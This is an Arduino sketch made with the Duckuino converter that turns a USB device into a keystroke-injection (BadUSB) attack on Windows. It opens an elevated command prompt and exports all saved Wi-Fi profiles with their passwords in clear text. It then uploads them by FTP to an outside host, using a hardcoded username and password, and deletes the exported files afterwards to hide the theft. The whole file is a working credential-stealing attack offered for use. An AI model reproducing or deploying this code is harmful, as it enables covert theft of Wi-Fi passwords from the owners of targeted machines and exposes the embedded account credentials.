/**
 * Made with Duckuino, an open-source project.
 * Check the license at 'https://github.com/Nurrl/Duckuino/blob/master/LICENSE'
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  delay(500);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(300);
  Keyboard.print(F("cmd"));

  delay(300);
  typeKey(KEY_LEFT_CTRL);

  typeKey(KEY_LEFT_SHIFT);

  typeKey(KEY_RETURN);

  delay(300);
  typeKey(KEY_LEFT_ARROW);

  delay(100);
  typeKey(KEY_RETURN);

  delay(300);
  Keyboard.print(F("cd C"));
  Keyboard.write(63);
  Keyboard.print(F("\334"));

  typeKey(KEY_RETURN);

  delay(100);
  Keyboard.print(F("md l"));

  typeKey(KEY_RETURN);

  delay(100);
  Keyboard.print(F("cd l && @netsh wlan export profile key=clear >nul"));

  typeKey(KEY_RETURN);

  delay(1000);
  Keyboard.print(F("ftp ftpupload.net"));

  typeKey(KEY_RETURN);

  delay(1200);
  Keyboard.print(F("epiz_22776842"));
  typeKey(KEY_RETURN);

  delay(1000);
  Keyboard.print(F("vpt3eQuw8q8"));
  typeKey(KEY_RETURN);

  delay(70);
  typeKey(KEY_RETURN);

  delay(500);
  Keyboard.print(F("cd htdocs\334pass"));

  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("mput C"));
  Keyboard.write(63);
  Keyboard.print(F("\334l\334*.xml"));

  typeKey(KEY_RETURN);

  delay(750);

  typeKey(KEY_RETURN);
  delay(750);

  typeKey(KEY_RETURN);

  delay(200);  
  Keyboard.print(F("bye"));
  typeKey(KEY_RETURN);
  
  delay(500);
  Keyboard.print(F("cd .."));

  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("del \334f \334s \334q l 1>nul"));
  typeKey(KEY_RETURN);
  
  delay(50);
  Keyboard.print(F("rmdir \334s \334q l"));
  typeKey(KEY_RETURN);

  delay(50);
  Keyboard.print(F("exit"));

  typeKey(KEY_RETURN);

  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
